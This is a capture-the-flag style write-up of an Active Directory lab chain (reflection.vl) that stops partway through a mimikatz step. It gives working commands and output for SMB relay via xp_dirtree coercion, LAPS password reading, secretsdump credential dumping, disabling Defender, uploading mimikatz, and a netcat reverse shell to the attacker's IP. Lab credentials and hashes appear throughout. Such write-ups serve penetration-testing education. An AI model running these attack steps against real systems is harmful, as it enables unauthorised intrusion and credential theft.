
### Nmap Scan

```bash
sudo nmap -sC -sV -Pn  10.10.138.69-71 --open
```

The Nmap scan results tend to be quite lengthy when it comes to chains, since there are multiple hosts to attack. So instead of showing you the output, I’ll summarize the important information that I extracted from it:

- We are given 3 IPs.
- The first IP resolves to “DC01.reflection.vl”
- The second IP resolves to “MS01.reflection.vl”
- The third and final IP resolves to “WS01.reflection.vl” .
- Port 1433 is open on both the MS01 server, as well as the DC01 server.
- DC01 is the domain-controller, MS01 is an MSSQL server, and WS01 is a normal windows workstation.

Other than that, we are looking at standard ports that you normally see open, such as SMB on 445, RDP on 3389, and WINRM on 5985. There is no FW between us and our targets, so we can reach all services without the need to pivot.
```output
Starting Nmap 7.95SVN ( https://nmap.org ) at 2025-09-30 18:57 EDT
Nmap scan report for 10.10.138.69
Host is up (0.022s latency).
Not shown: 987 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-30 22:58:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: REFLECTION
|   NetBIOS_Domain_Name: REFLECTION
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: reflection.vl
|   DNS_Computer_Name: dc01.reflection.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-09-30T22:58:08+00:00
| ssl-cert: Subject: commonName=dc01.reflection.vl
| Not valid before: 2025-09-29T22:57:21
|_Not valid after:  2026-03-31T22:57:21
|_ssl-date: 2025-09-30T22:58:50+00:00; +1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-30T22:58:09
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Nmap scan report for 10.10.138.70
Host is up (0.023s latency).
Not shown: 995 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.138.70:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-09-30T22:58:49+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.138.70:1433: 
|     Target_Name: REFLECTION
|     NetBIOS_Domain_Name: REFLECTION
|     NetBIOS_Computer_Name: MS01
|     DNS_Domain_Name: reflection.vl
|     DNS_Computer_Name: ms01.reflection.vl
|     DNS_Tree_Name: reflection.vl
|_    Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-09-30T22:57:37
|_Not valid after:  2055-09-30T22:57:37
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=ms01.reflection.vl
| Not valid before: 2025-09-29T22:57:06
|_Not valid after:  2026-03-31T22:57:06
| rdp-ntlm-info: 
|   Target_Name: REFLECTION
|   NetBIOS_Domain_Name: REFLECTION
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: reflection.vl
|   DNS_Computer_Name: ms01.reflection.vl
|   DNS_Tree_Name: reflection.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-09-30T22:58:09+00:00
|_ssl-date: 2025-09-30T22:58:49+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-30T22:58:17
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Post-scan script results:
| clock-skew: 
|   0s: 
|     10.10.138.70
|_    10.10.138.69
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 61.40 seconds

```

### Looking For Open Shares

We can begin our journey by searching for any SMB shares that are open and available to us without authentication:

```bash
netexec smb 10.10.138.69-71 -u guest -p ''  
```

```output
SMB         10.10.138.71    445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False) 
SMB         10.10.138.69    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False) 
SMB         10.10.138.70    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False) 
SMB         10.10.138.71    445    WS01             [-] reflection.vl\guest: STATUS_ACCOUNT_DISABLED 
SMB         10.10.138.69    445    DC01             [-] reflection.vl\guest: STATUS_ACCOUNT_DISABLED 
SMB         10.10.138.70    445    MS01             [+] reflection.vl\guest: 

```

I’ll first note that netexec tells us that signing is disabled on all hosts. This could open up a vector of attack called “SMB-Relay”. We will explore this later on.

We can see that MS01 allows us to connect, while DC01 and WS01 tell us that the ‘guest’ account is disabled. The reason this works on MS01 and not on the other servers, is actually quite interesting and I somehow only learned about it today.

When you try to authenticate to SMB with a domain account, if the authentication fails, SMB falls back to local accounts with the same name. So, the authentication on WS01 and DC01 failed because the local guest accounts are disabled there, while the same account is enabled on MS01.

The same thing happens when you authenticate with a user that doesn’t exist, again — because the hosts fall back to the local guest account when that happens:

```bash
 netexec smb 10.10.138.69-71 -u 'thisuserdoesntexist' -p '' 
```

```output
SMB         10.10.138.69    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False) 
SMB         10.10.138.71    445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False) 
SMB         10.10.138.70    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False) 
SMB         10.10.138.69    445    DC01             [-] reflection.vl\thisuserdoesntexist: STATUS_LOGON_FAILURE 
SMB         10.10.138.71    445    WS01             [-] reflection.vl\thisuserdoesntexist: STATUS_LOGON_FAILURE 
SMB         10.10.138.70    445    MS01             [+] reflection.vl\thisuserdoesntexist: (Guest)
```

Anyway, enough of that — let’s check the shares on MS01:

```bash
netexec smb 10.10.138.70  -u guest  -p '' --shares
```

```output
SMB         10.10.138.70    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False) 
SMB         10.10.138.70    445    MS01             [+] reflection.vl\guest: 
SMB         10.10.138.70    445    MS01             [*] Enumerated shares
SMB         10.10.138.70    445    MS01             Share           Permissions     Remark
SMB         10.10.138.70    445    MS01             -----           -----------     ------
SMB         10.10.138.70    445    MS01             ADMIN$                          Remote Admin
SMB         10.10.138.70    445    MS01             C$                              Default share
SMB         10.10.138.70    445    MS01             IPC$            READ            Remote IPC
SMB         10.10.138.70    445    MS01             staging         READ            staging environment
```

We can see a “staging” share, and we have read access to it. Let’s explore:

```bash
smbclient //10.10.138.70/staging -U guest% -I 10.10.138.70
```

```output
smb: \> ls
  .                                   D        0  Wed Jun  7 13:42:48 2023
  ..                                  D        0  Wed Jun  7 13:41:25 2023
  staging_db.conf                     A       50  Thu Jun  8 07:21:49 2023

smb: \> get staging_db.conf
getting file \staging_db.conf of size 50 as staging_db.conf (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \> exit
```

```bash
cat staging_db.conf

user=web_staging
password=Washroom510
db=staging    

```

Looks like we hit the jackpot — a file with cleartext credentials is found!

Judging by the file’s name and content, these are probably credentials for one of the MSSQL instances in the domain. Still, doesn’t hurt to check if there is a domain user with these credentials as well:

```bash
netexec smb 10.10.138.70  -u 'web_staging'  -p 'Washroom510' -k
```

```output
MB         10.10.138.70    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False) 
SMB         10.10.138.70    445    MS01             [-] reflection.vl\web_staging:Washroom510 [Errno Connection error (10.10.138.71:88)] [Errno 110] Connection timed out
                                             
```

There is no “web_staging” domain user, as indicated by the “KDC_ERR_C_PRINICIPAL_UNKNOWN” error.

Let’s try the credentials for MSSQL

```bash
netexec mssql  10.10.138.70  -u 'web_staging'  -p 'Washroom510' --local-auth
```

```output
MSSQL       10.10.138.70    1433   MS01             [*] Windows Server 2022 Build 20348 (name:MS01) (domain:reflection.vl)
MSSQL       10.10.138.70    1433   MS01             [+] MS01\web_staging:Washroom510 
```

We get a hit for the MSSQL instance running on MS01!

### Exploring The Database

We can connect to the database with our credentials and take a look:
```bash
 mssqlclient.py  web_staging@ms01.reflection.vl
```

```output
SQL (web_staging  guest@master)> enum_db
name      is_trustworthy_on   
-------   -----------------   
master                    0   

tempdb                    0   

model                     0   

msdb                      1   

staging                   0   

SQL (web_staging  guest@master)> use staging 
ENVCHANGE(DATABASE): Old Value: master, New Value: staging
INFO(MS01\SQLEXPRESS): Line 1: Changed database context to 'staging'.
SQL (web_staging  dbo@staging)> select names from sys.tables;
ERROR(MS01\SQLEXPRESS): Line 1: Invalid column name 'names'.
SQL (web_staging  dbo@staging)> select name from sys.tables;
name    
-----   
users   

SQL (web_staging  dbo@staging)> select * from users ;
id   username   password        
--   --------   -------------   
 1   b'dev01'   b'Initial123'   

 2   b'dev02'   b'Initial123'   

SQL (web_staging  dbo@staging)> 


```

We find more credentials in the “Staging” DB, but as you can probably tell by the fact I haven’t redacted them — they don’t lead anywhere:
```bash
netexec smb 10.10.138.70  -u 'dev01'  -p 'Initial123' -k 
```

```
SMB         10.10.138.70    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False) 
```

```bash
netexec smb 10.10.138.70  -u 'dev02'  -p 'Initial123' -k
```

```output
SMB         10.10.138.70    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False) 
```

So, maybe we can try the old “xp_dirtree” trick to coerce an authentication against our responder?

```bash
SQL (web_staging  guest@master)> xp_dirtree \\10.8.7.96\stealer
```

```bash
sudo responder -I tun0
```

```output
svc_web_staging::REFLECTION:e0ba3f259821f7b9:4C94C1279FA47EFF173DE4BEDA591680:010100000000000000AFBF164732DC015D9D403F0EE97A6C000000000200080044004D004600520001001E00570049004E002D0055003900390054004100310034004B004B004900530004003400570049004E002D0055003900390054004100310034004B004B00490053002E0044004D00460052002E004C004F00430041004C000300140044004D00460052002E004C004F00430041004C000500140044004D00460052002E004C004F00430041004C000700080000AFBF164732DC010600040002000000080030003000000000000000000000000030000070F83ADE0B046CBA7CC6EDA8C4938FD5F9D9321E4B014FD7F10E2A5B19922A130A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0037002E00390036000000000000000000                              

```

We capture the NTLMv2 hash of “svc_web_staging”, which is a domain user. If we can crack it we will have our foothold within the domain.

Unfortunately, the hash won’t crack, and we are left empty-handed once more.

### SMB Relay

The next thing that we can try is to relay the SMB authentication to other hosts in the network. Here is what happens in an SMB-Relay attack, I’ll be using hosts and users from our network to explain:

1. svc_web_staging asks to authenticate to our SMB share.
2. We contact another host, the DC (for example), and say that we are svc_web_staging and would like access to SMB.
3. The DC responds with an NTLM challenge.
4. We forward the challenge to svc_web_staging, and he in turn encrypts it with his NT hash, and sends it back to us.
5. We forward the response to the DC, and gain access to SMB.

This is all possible because the signing on the SMB is disabled.

Now, we coerce an authentication to SMB via xp_dirtree again:
```bash
xp_dirtree \\10.8.7.96\relay
```

And if we check ntlmrelayx :

```bash
ntlmrelayx.py  -smb2support -tf targets.txt -i

```

```output
SMBD-Thread-5 (process_request_thread): Connection from REFLECTION/SVC_WEB_STAGING@10.10.138.70 controlled, attacking target smb://10.10.138.69
[*] Authenticating against smb://10.10.138.69 as REFLECTION/SVC_WEB_STAGING SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
[]
[*] SMBD-Thread-5 (process_request_thread): Connection from REFLECTION/SVC_WEB_STAGING@10.10.138.70 controlled, attacking target smb://10.10.138.70
[-] Authenticating against smb://10.10.138.70 as REFLECTION/SVC_WEB_STAGING FAILED
[*] Received connection from REFLECTION/svc_web_staging at MS01, connection will be relayed after re-authentication
[ParseResult(scheme='smb', netloc='REFLECTION\\SVC_WEB_STAGING@10.10.138.70', path='', params='', query='', fragment='')]
[*] SMBD-Thread-7 (process_request_thread): Connection from REFLECTION/SVC_WEB_STAGING@10.10.138.70 controlled, attacking target smb://10.10.138.71
[*] Authenticating against smb://10.10.138.71 as REFLECTION/SVC_WEB_STAGING SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11001
[*] All targets processed!
[*] SMBD-Thread-7 (process_request_thread): Connection from REFLECTION/SVC_WEB_STAGING@10.10.138.70 controlled, but there are no more targets left!
[*] Received connection from REFLECTION/svc_web_staging at MS01, connection will be relayed after re-authentication
[*] Received connection from REFLECTION/svc_web_staging at MS01, connection will be relayed after re-authentication
[*] All targets processed!
[*] SMBD-Thread-9 (process_request_thread): Connection from REFLECTION/SVC_WEB_STAGING@10.10.138.70 controlled, but there are no more targets left!
[*] Received connection from REFLECTION/svc_web_staging at MS01, connection will be relayed after re-authentication
[*] All targets processed!
[*] SMBD-Thread-10 (process_request_thread): Connection from REFLECTION/SVC_WEB_STAGING@10.10.138.70 controlled, but there are no more targets left!
[*] Received connection from REFLECTION/svc_web_staging at MS01, connection will be relayed after re-authentication
[*] All targets processed!
[*] SMBD-Thread-11 (process_request_thread): Connection from REFLECTION/SVC_WEB_STAGING@10.10.138.70 controlled, but there are no more targets left!
[*] Received connection from REFLECTION/svc_web_staging at MS01, connection will be relayed after re-authentication
```

And it looks like it worked! We now have an SMB client with an open session on the DC, at port 11000, and another one on the WS01 SMB at port 11001. Note that the authentication failed for MS01, since that is the host we are relaying from, and we can’t relay from the host to itself.

### Pillaging SMB and MSSQL

We can now connect to our SMB client:

```bash
nc 127.0.0.1 11000

```

```output
Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
prod
SYSVOL
```

We can see a non-default “prod” share on the DC.

Let’s investigate:

```bash
# use prod
# ls
drw-rw-rw-          0  Wed Jun  7 13:44:26 2023 .
drw-rw-rw-          0  Wed Jun  7 13:43:22 2023 ..
-rw-rw-rw-         45  Thu Jun  8 07:24:39 2023 prod_db.conf
# cat prod_db.conf
user=web_prod
password=Tribesman201
db=prod
```

We find more credentials, this time for “web_prod”. We can test to see if this is a domain user:

```bash
netexec smb 10.10.138.70  -u 'web_prod'  -p 'Tribesman201' -k
```

```output
SMB         10.10.138.70    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False) 


```

Once again, no luck. We still don’t have a foothold in the domain.
We can test for MSSQL connections

```bash
 netexec mssql 10.10.138.69-71  -u 'web_prod'  -p 'Tribesman201' --local-auth
```

## OUTPUT

```output
MSSQL       10.10.138.70    1433   MS01             [*] Windows Server 2022 Build 20348 (name:MS01) (domain:reflection.vl)
MSSQL       10.10.138.69    1433   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:reflection.vl)
MSSQL       10.10.138.70    1433   MS01             [-] MS01\web_prod:Tribesman201 (Login failed for user 'web_prod'. Please try again with or without '--local-auth')
MSSQL       10.10.138.69    1433   DC01             [+] DC01\web_prod:Tribesman201 
```

We can login to MSSQL on DC01. Let’s do that and investigate the databases:
```bash
mssqlclient.py  web_prod@dc01.reflection.vl
```

```output
assword:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (web_prod  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1   

prod                     0   

SQL (web_prod  guest@master)> use prod;
ENVCHANGE(DATABASE): Old Value: master, New Value: prod
INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'prod'.
SQL (web_prod  dbo@prod)> use prod
ENVCHANGE(DATABASE): Old Value: prod, New Value: prod
INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'prod'.
SQL (web_prod  dbo@prod)> select name from sys.tables; 
name    
-----   
users   

SQL (web_prod  dbo@prod)> select * from users;
id   name              password            
--   ---------------   -----------------   
 1   b'abbie.smith'    b'CMe1x+nlRaaWEw'   

 2   b'dorothy.rose'   b'hC_fny3OK9glSJ'   


```
We find more plain-text credentials, and this time when we try them as domain users…
```bash
netexec smb 10.10.138.69-71  -u 'dorothy.rose'  -p 'hC_fny3OK9glSJ'   
```

```output
SMB         10.10.138.70    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False) 
SMB         10.10.138.71    445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False) 
SMB         10.10.138.69    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False) 
SMB         10.10.138.70    445    MS01             [+] reflection.vl\dorothy.rose:hC_fny3OK9glSJ 
SMB         10.10.138.71    445    WS01             [+] reflection.vl\dorothy.rose:hC_fny3OK9glSJ 
SMB         10.10.138.69    445    DC01             [+] reflection.vl\dorothy.rose:hC_fny3OK9glSJ 

```

```bash
netexec smb 10.10.138.69-71  -u 'abbie.smith'  -p 'CMe1x+nlRaaWEw'    
```

```output
SMB         10.10.138.69    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False) 
SMB         10.10.138.71    445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False) 
SMB         10.10.138.70    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False) 
SMB         10.10.138.69    445    DC01             [+] reflection.vl\abbie.smith:CMe1x+nlRaaWEw 
SMB         10.10.138.71    445    WS01             [+] reflection.vl\abbie.smith:CMe1x+nlRaaWEw 
SMB         10.10.138.70    445    MS01             [+] reflection.vl\abbie.smith:CMe1x+nlRaaWEw 
```

Not only do we have a user in the domain, but we have two!

### Bloodhound — Exploring RBCD (& Failing)

The first thing I did before running bloodhound is to check the level of access our new users have in the domain. I tried using netexec with their credentials on different services like RDP, WINRM, and SMB (checking for write privileges in shares). This all led me nowhere, so I’ll save you some time.

Let’s run bloodhound-python and gather as much information as we can:

```bash
bloodhound-python -u abbie.smith -p 'CMe1x+nlRaaWEw' -d reflection.vl -v --zip -c All -dc dc01.reflection.vl -ns 10.10.138.69 
```

```bash
sudo neo4j start
bloodhound
```

There is nothing interesting about dorothy.rose, but if we check the outbound object control that abbie.smith has…


![[Pasted image 20251001024021.png]]
Abbie has “GenericAll” over MS01! This, in theory, should allow us to perform a resource-based constrained delegation attack.

Since Abbie has “GenericAll”, she can configure who is allowed to delegate to MS01. But, she can only give that right to accounts that have an SPN configured in their name.

For example, the user svc_web_staging, that we saw earlier, is in charge of the MSSQL service on MS01, and has the following SPN configured:

So, if Abbie uses her “GenericAll” to configure on MS01 that svc_web_staging is allowed to delegate to it, then that user can authenticate to MS01 on behalf of anyone in the domain that isn’t a part of “Protected Users”.

This, however, requires that we know the password/NT hash of svc_web_staging. And unfortunately, we don’t.

Machine accounts have SPNs tied to them by default, so in theory, if we can add a new computer to the domain, we can control it’s password, and we will have access to a user with an SPN.

By default, the MachineAccountQuota inside domains (which is the setting that determines how many machines each user in the domain can add), is set to 10. Let’s check if that’s the case:

```bash
netexec ldap dc01.reflection.vl  -u abbie.smith -p 'CMe1x+nlRaaWEw' -M maq     
```

```output
DAP        10.10.138.69    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:reflection.vl)
LDAP        10.10.138.69    389    DC01             [+] reflection.vl\abbie.smith:CMe1x+nlRaaWEw 
MAQ         10.10.138.69    389    DC01             [*] Getting the MachineAccountQuota
MAQ         10.10.138.69    389    DC01             MachineAccountQuota: 0
```

No luck there. The MachineAccountQuota is set to 0, which means that we can’t add new computers to the domain.

At this point, I spent some time looking into “SPNless RBCD” but everything I tried failed. I decided to look deeper into bloodhound.

### LAPS

If we click on the “MS01” node in bloodhound, we can see what GPOs affect this object:
![[Pasted image 20251001024740.png]]

![[Pasted image 20251001024759.png]]

We can see that there is a GPO called “LAPS_POLICY”.

LAPS is a protocol that if enabled, generates a long and complex password for the local administrator on the host, and changes that password periodically.

Since Abbie has “GenericAll” over MS01, we can read the current LAPS password:
```bash
 netexec ldap dc01.reflection.vl  -u abbie.smith -p 'CMe1x+nlRaaWEw' -M laps
```

```output
DAP        10.10.138.69    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:reflection.vl)
LDAP        10.10.138.69    389    DC01             [+] reflection.vl\abbie.smith:CMe1x+nlRaaWEw 
LAPS        10.10.138.69    389    DC01             [*] Getting LAPS Passwords
LAPS        10.10.138.69    389    DC01             Computer:MS01$ User:                Password:H447.++h6g5}xi
```

With this password, we can authenticate as the local administrator on MS01:

```bash
netexec smb   10.10.138.70  -u administrator -p 'H447.++h6g5}xi' --local-auth
```

```output

SMB         10.10.138.70    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False) 
SMB         10.10.138.70    445    MS01             [+] MS01\administrator:H447.++h6g5}xi (Pwn3d!)

```

### Remote Credential Dumping

Before we rush to get a shell on MS01, let’s try dumping credentials from this server remotely. I like using impacket-secretsdump to dump most of the credentials, and then finish things off with netexec, which makes dumping the credentials stored in DPAPI very easy:

```bash
impacket-secretsdump administrator@ms01.reflection.vl
```

```output
Password:
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf0093534e5f21601f5f509571855eeee
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3819a8ecec5fd33f6ecb83253b24309a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:bb5d8648678f590b8b3051e24a985345:::
labadm:1000:aad3b435b51404eeaad3b435b51404ee:2a50f9a04b270a24fcd474092ebd9c8e:::
[*] Dumping cached domain logon information (domain/username:hash)
REFLECTION.VL/svc_web_staging:$DCC2$10240#svc_web_staging#6123c7b97697564e016b797de99025dd: (2023-06-07 19:08:01+00:00)
REFLECTION.VL/Administrator:$DCC2$10240#Administrator#10c8403d0d68c47754170bf825ffbe9d: (2023-06-07 19:11:08+00:00)
REFLECTION.VL/Georgia.Price:$DCC2$10240#Georgia.Price#f20a83b9452ce1c17cf4a57c2b05f7ec: (2025-09-30 23:13:08+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
REFLECTION\MS01$:aes256-cts-hmac-sha1-96:af19ddf23cd8bbfbcbf7850cb14dd0efd2b39040121355bf62e428300d7586ab
REFLECTION\MS01$:aes128-cts-hmac-sha1-96:773807a6619470080dcb96e71900fc30
REFLECTION\MS01$:des-cbc-md5:cbcbce1c5ec425ec
REFLECTION\MS01$:plain_password_hex:ab1726d3c09b5118c393ba6e75b0af3c4e787117ddd71eb37ca8624eec451bb467228545569000f036082bd1e9f6aa585d246220ec81a6d88935a4c9deafbea4bb16308a1cafaa54714f3d39b3e94738eaebc78201b28fcb949924b3a53487ab189c5a71320f57af64c2a98d7502da8accf0c5b00ff9400b9829bae5090f8d0f06dcd8020e95a9c1b163cd94eb63ecf9998b2253776988151a2336a204e5da8926effdd9f70d6789f11c078eb3690c8d5b2ead355d94aa55e18f5a8c93adce4bbcb39731f006ec4a9b71500678516d8e7c933a953457b390c6970abb5ac649c2a94a660b1d767026b7a28e85ee63af9d
REFLECTION\MS01$:aad3b435b51404eeaad3b435b51404ee:ceabac8472ec89e747d77c21b1691d27:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb7ad02ee5577322cc2a2e096b7bab17101a4f9a7
dpapi_userkey:0x9de553e3a73ece7cff322d722fc9fbdfe4fd78cc
[*] NL$KM 
 0000   C0 BE 31 EA 49 A4 51 79  67 62 D2 F1 C2 22 1C BE   ..1.I.Qygb..."..
 0010   CE 86 94 CF D5 32 5D 73  32 64 85 4C 37 81 7B AE   .....2]s2d.L7.{.
 0020   0C D1 61 83 A3 65 91 58  D6 F0 B3 17 47 5F 64 93   ..a..e.X....G_d.
 0030   A4 AC D7 4F E7 E4 A5 EE  E8 6D BE 93 7A CF 35 77   ...O.....m..z.5w
NL$KM:c0be31ea49a451796762d2f1c2221cbece8694cfd5325d733264854c37817bae0cd16183a3659158d6f0b317475f6493a4acd74fe7e4a5eee86dbe937acf3577
[*] _SC_MSSQL$SQLEXPRESS 
REFLECTION\svc_web_staging:DivinelyPacifism98
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

```

There is a lot of output, and you should save everything to your notes. However, I’ll only focus here on the important parts.

First, from secretsdump we get the clear-text password of svc_web_staging:

password

```bash
svc_web_staging:DivinelyPacifism98

```

Then, from DPAPI we get the clear-text password of “Georgia.Price”, since she had a scheduled task running with her credentials on MS01:

### Back to RBCD (Resource Based Constrain Delegation)

If we check Georgia’s outbound object control in bloodhound, we can see that she has GenericAll over WS01:

![[Pasted image 20251001031306.png]]
LAPS isn’t configured for WS01, so we can’t replicate what we did with MS01.

```bash
evil-winrm -i 10.10.176.214 -u 'administrator' -p 'H447.++h6g5}xi'

```

```bash
nfo: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> Set-MpPreference -DisableRealtimeMonitoring $true
*Evil-WinRM* PS C:\Users\Administrator> upload mimikatz.exe
                                        
Info: Uploading /home/kali/Downloads/Reflection/mimikatz.exe to C:\Users\Administrator\mimikatz.exe
                                        
Data: 1807016 bytes of 1807016 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Administrator> upload nc64.exe
                                        
Info: Uploading /home/kali/Downloads/Reflection/nc64.exe to C:\Users\Administrator\nc64.exe
                                        
Data: 60360 bytes of 60360 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Administrator> .\nc64.exe 10.8.7.96 4444 -e cmd.exe


```

lets use mimikatz
```bash
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

572     {0;000003e7} 1 D 27285          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;003a4f54} 0 D 3881679     MS01\Administrator      S-1-5-21-1123338414-2776126748-2899213862-500   (11g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 3926635     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::cache
Domain : MS01
SysKey : f0093534e5f21601f5f509571855eeee

Local name : MS01 ( S-1-5-21-1123338414-2776126748-2899213862 )
Domain name : REFLECTION ( S-1-5-21-3375389138-1770791787-1490854311 )
Domain FQDN : reflection.vl

Policy subsystem is : 1.18
LSA Key(s) : 1, default {d51bd4aa-2bdf-d430-e49b-8602d14c589d}
  [00] {d51bd4aa-2bdf-d430-e49b-8602d14c589d} 921d4aaa21dc865c87df04784a9d36237daa5a40c63353775c6166fc62b1e1a4

* Iteration is set to default (10240)

[NL$1 - 6/7/2023 12:08:01 PM]
RID       : 0000045f (1119)
User      : REFLECTION\svc_web_staging
MsCacheV2 : 6123c7b97697564e016b797de99025dd

[NL$2 - 6/7/2023 12:11:08 PM]
RID       : 000001f4 (500)
User      : REFLECTION\Administrator
MsCacheV2 : 10c8403d0d68c47754170bf825ffbe9d

[NL$3 - 9/30/2025 7:33:58 PM]
RID       : 00000454 (1108)
User      : REFLECTION\Georgia.Price
MsCacheV2 : f20a83b9452ce1c17cf4a57c2b05f7ec

mimikatz # vault::cred /patch
